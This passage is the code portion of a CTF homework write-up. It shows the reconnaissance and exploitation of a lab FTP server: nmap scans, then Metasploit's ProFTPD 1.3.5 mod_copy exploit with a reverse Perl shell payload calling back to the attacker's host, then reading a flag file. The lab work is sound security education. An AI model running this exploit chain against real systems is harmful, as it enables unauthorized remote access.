<span class="copy-icon tw-block"><svg class="icon" viewBox="0 0 448 512"><path d="M433.941 65.941l-51.882-51.882A48 48 0 00348.118.0H176c-26.51.0-48 21.49-48 48v48H48c-26.51.0-48 21.49-48 48v320c0 26.51 21.49 48 48 48h224c26.51.0 48-21.49 48-48v-48h80c26.51.0 48-21.49 48-48V99.882a48 48 0 00-14.059-33.941zM266 464H54a6 6 0 01-6-6V150a6 6 0 016-6h74v224c0 26.51 21.49 48 48 48h96v42a6 6 0 01-6 6zm128-96H182a6 6 0 01-6-6V54a6 6 0 016-6h106v88c0 13.255 10.745 24 24 24h88v202a6 6 0 01-6 6zm6-256h-64V48h9.632c1.591.0 3.117.632 4.243 1.757l48.368 48.368a6 6 0 011.757 4.243V112z"/></svg></span>
<span class="check-icon tw-hidden"><svg class="icon" viewBox="0 0 512 512"><path d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206.0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204.0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204.0l36.203 36.204c9.997 9.997 9.997 26.206.0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"/></svg></span>
</button>
<button class="tw-select-none
tw-mx-2
tw-block
group-[.is-open]:tw-hidden
print:!tw-hidden" disabled aria-hidden=true><svg class="icon" viewBox="0 0 512 512"><path d="M328 256c0 39.8-32.2 72-72 72s-72-32.2-72-72 32.2-72 72-72 72 32.2 72 72zm104-72c-39.8.0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72zm-352 0c-39.8.0-72 32.2-72 72s32.2 72 72 72 72-32.2 72-72-32.2-72-72-72z"/></svg></button></div></div><pre style=counter-reset:codeblock class="tw-block tw-m-0 tw-p-0"><code id=codeblock-id-4 class="chroma
!tw-block
tw-p-0
tw-m-0
tw-transition-[max-height]
tw-duration-500
tw-ease-in-out
group-[.is-closed]:!tw-max-h-0
group-[.is-wrap]:tw-text-wrap
tw-overflow-y-hidden
tw-overflow-x-auto
tw-scrollbar-thin"><span class=line><span class=cl>$ ifconfig <span class=c1># check current host ip: 172.30.0.3</span>
</span></span><span class=line><span class=cl>$ nmap 172.30.0.0/24 <span class=c1># scan LAN, find FTP host (ip 172.30.0.2, port 21)</span>
</span></span><span class=line><span class=cl>$ nmap -sV -p <span class=m>21</span> 172.30.0.2 <span class=c1># check host details, found ProFTPD 1.3.5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ msfconsole
</span></span><span class=line><span class=cl>msf5 &gt; search ProFTPD 1.3.5
</span></span><span class=line><span class=cl>msf5 &gt; use unix/ftp/proftpd_modcopy_exec
</span></span><span class=line><span class=cl>msf5 exploit<span class=o>(</span>unix/ftp/proftpd_modcopy_exec<span class=o>)</span> &gt; show options
</span></span><span class=line><span class=cl>msf5 exploit<span class=o>(</span>unix/ftp/proftpd_modcopy_exec<span class=o>)</span> &gt; <span class=nb>set</span> RHOST &lt;target_ip&gt;
</span></span><span class=line><span class=cl>msf5 exploit<span class=o>(</span>unix/ftp/proftpd_modcopy_exec<span class=o>)</span> &gt; <span class=nb>set</span> SITEPATH &lt;target_directory&gt;
</span></span><span class=line><span class=cl>msf5 exploit<span class=o>(</span>unix/ftp/proftpd_modcopy_exec<span class=o>)</span> &gt; show payloads
</span></span><span class=line><span class=cl>msf5 exploit<span class=o>(</span>unix/ftp/proftpd_modcopy_exec<span class=o>)</span> &gt; <span class=nb>set</span> payload cmd/unix/reverse_perl
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf5 exploit<span class=o>(</span>unix/ftp/proftpd_modcopy_exec<span class=o>)</span> &gt; show options
</span></span><span class=line><span class=cl>msf5 exploit<span class=o>(</span>unix/ftp/proftpd_modcopy_exec<span class=o>)</span> &gt; <span class=nb>set</span> LHOST &lt;localhost_ip&gt;
</span></span><span class=line><span class=cl>msf5 exploit<span class=o>(</span>unix/ftp/proftpd_modcopy_exec<span class=o>)</span> &gt; exploit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>reverse shell<span class=o>)</span>
</span></span><span class=line><span class=cl>ls
</span></span><span class=line><span class=cl>ls _backup
</span></span><span class=line><span class=cl>cat _backup/f1aaag.txt</span></span></code></pre></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2020-11-09</span></div><div class=post-info-license></div></div><div class="post-info-line print:!tw-hidden"><div class=post-info-md></div><div class=post-info-share></div></div></div><div class=post-info-more><section class=post-tags><svg class="icon" viewBox="0 0 640 512"><path d="M497.941 225.941 286.059 14.059A48 48 0 00252.118.0H48C21.49.0.0 21.49.0 48v204.118a48 48 0 0014.059 33.941l211.882 211.882c18.744 18.745 49.136 18.746 67.882.0l204.118-204.118c18.745-18.745 18.745-49.137.0-67.882zM112 160c-26.51.0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm513.941 133.823L421.823 497.941c-18.745 18.745-49.137 18.745-67.882.0l-.36-.36L527.64 323.522c16.999-16.999 26.36-39.6 26.36-63.64s-9.362-46.641-26.36-63.64L331.397.0h48.721a48 48 0 0133.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137.0 67.882z"/></svg>&nbsp;<a href></a>,&nbsp;<a href=/en/tags/ctf-writeup/>CTF-Writeup</a></section><section class=print:!tw-hidden><span><button class="tw-text-fgColor-link-muted hover:tw-text-fgColor-link-muted-hover" onclick=window.history.back()>Back</button></span>&nbsp;|&nbsp;<span><a href=/en/>Home</a></span></section></div><div class="post-nav print:tw-hidden"><a href=/en/posts/2020/nsysu-htcf-hw1/ class=prev rel=prev title="[NSYSU Hacking Attack & Defense] HW 0x01 Writeup"><svg class="icon" viewBox="0 0 256 512"><path d="M31.7 239l136-136c9.4-9.4 24.6-9.4 33.9.0l22.6 22.6c9.4 9.4 9.4 24.6.0 33.9L127.9 256l96.4 96.4c9.4 9.4 9.4 24.6.0 33.9L201.7 409c-9.4 9.4-24.6 9.4-33.9.0l-136-136c-9.5-9.4-9.5-24.6-.1-34z"/></svg>[NSYSU Hacking Attack & Defense] HW 0x01 Writeup</a>
<a href=/en/posts/2020/nsysu-htcf-hw2/ class=next rel=next title="[NSYSU Hacking Attack & Defense] HW 0x02 Writeups">[NSYSU Hacking Attack & Defense] HW 0x02 Writeups<svg class="icon" viewBox="0 0 256 512"><path d="M224.3 273l-136 136c-9.4 9.4-24.6 9.4-33.9.0l-22.6-22.6c-9.4-9.4-9.4-24.6.0-33.9l96.4-96.4-96.4-96.4c-9.4-9.4-9.4-24.6.0-33.9L54.3 103c9.4-9.4 24.6-9.4 33.9.0l136 136c9.5 9.4 9.5 24.6.1 34z"/></svg></a></div></div><div id=comments class="print:!tw-hidden tw-pt-32 tw-pb-8"><div id=utterances></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.</noscript></div></article></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreferrer" title="Hugo 0.150.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href=https://github.com/HEIGE-PCloud/DoIt target=_blank rel="noopener noreferrer" title="DoIt 0.4.2"><svg class="icon" viewBox="0 0 576 512"><path d="M402.3 344.9l32-32c5-5 13.7-1.5 13.7 5.7V464c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V112c0-26.5 21.5-48 48-48h273.5c7.1.0 10.7 8.6 5.7 13.7l-32 32c-1.5 1.5-3.5 2.3-5.7 2.3H48v352h352V350.5c0-2.1.8-4.1 2.3-5.6zm156.6-201.8L296.3 405.7l-90.4 10c-26.2 2.9-48.5-19.2-45.6-45.6l10-90.4L432.9 17.1c22.9-22.9 59.9-22.9 82.7.0l43.2 43.2c22.9 22.9 22.9 60 .1 82.8zM460.1 174 402 115.9 216.2 301.8l-7.3 65.3 65.3-7.3L460.1 174zm64.8-79.7-43.2-43.2c-4.1-4.1-10.8-4.1-14.8.0L436 82l58.1 58.1 30.9-30.9c4-4.2 4-10.8-.1-14.9z"/></svg> DoIt</a></div><div class=footer-line><svg class="icon" viewBox="0 0 512 512"><path d="M256 8C119.033 8 8 119.033 8 256s111.033 248 248 248 248-111.033 248-248S392.967 8 256 8zm0 448c-110.532.0-2e2-89.451-2e2-2e2.0-110.531 89.451-2e2 2e2-2e2 110.532.0 2e2 89.451 2e2 2e2.0 110.532-89.451 2e2-2e2 2e2zm107.351-101.064c-9.614 9.712-45.53 41.396-104.065 41.396-82.43.0-140.484-61.425-140.484-141.567.0-79.152 60.275-139.401 139.762-139.401 55.531.0 88.738 26.62 97.593 34.779a11.965 11.965.0 011.936 15.322l-18.155 28.113c-3.841 5.95-11.966 7.282-17.499 2.921-8.595-6.776-31.814-22.538-61.708-22.538-48.303.0-77.916 35.33-77.916 80.082.0 41.589 26.888 83.692 78.277 83.692 32.657.0 56.843-19.039 65.726-27.225 5.27-4.857 13.596-4.039 17.82 1.738l19.865 27.17a11.947 11.947.0 01-1.152 15.518z"/></svg>2019 - 2026<span class=author>&nbsp;<a href=https://blog.cyris.tw target=_blank rel="noopener noreferrer">Cyris Tseng</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer><div class="print:!tw-hidden tw-flex tw-flex-col tw-fixed tw-right-4 tw-bottom-4 tw-gap-2"><a href=#back-to-top id=back-to-top-button class="tw-transition-opacity tw-opacity-0 tw-block tw-bg-bgColor-secondary tw-rounded-full" style=padding:.6rem;line-height:1.3rem;font-size:1rem title="Back to Top"><svg class="icon" viewBox="0 0 448 512"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6.0-33.9L207 39c9.4-9.4 24.6-9.4 33.9.0l194.3 194.3c9.4 9.4 9.4 24.6.0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3.0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg>
</a><button id=toc-drawer-button class="tw-block tw-bg-bgColor-secondary tw-rounded-full md:tw-hidden" style=padding:.6rem;line-height:1.3rem;font-size:1rem>
<svg class="icon" viewBox="0 0 448 512"><path d="M16 132h416c8.837.0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163.0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837.0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837.0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"/></svg>
</button><a href=#comments id=view-comments class="tw-block tw-bg-bgColor-secondary tw-rounded-full" style=padding:.6rem;line-height:1.3rem;font-size:1rem title="View Comments">
<svg class="icon" viewBox="0 0 512 512"><path d="M256 32C114.6 32 0 125.1.0 240c0 49.6 21.4 95 57 130.7C44.5 421.1 2.7 466 2.2 466.5c-2.2 2.3-2.8 5.7-1.5 8.7S4.8 480 8 480c66.3.0 116-31.8 140.6-51.4 32.7 12.3 69 19.4 107.4 19.4 141.4.0 256-93.1 256-208S397.4 32 256 32z"/></svg></a></div><script>window.config={comment:{utterances:{darkTheme:"github-dark",issueTerm:"pathname",label:"Comment 💬",lightTheme:"github-light",repo:"yctseng1227/blog-comments"}}}</script><script src=/js/theme.min.js defer></script><script src=/js/utterances.min.js defer></script><script type=speculationrules>
  {
    "prerender": [
      {
        "where": { "href_matches": "/*" },
        "eagerness": "moderate"
      }
    ]
  }
</script></body></html>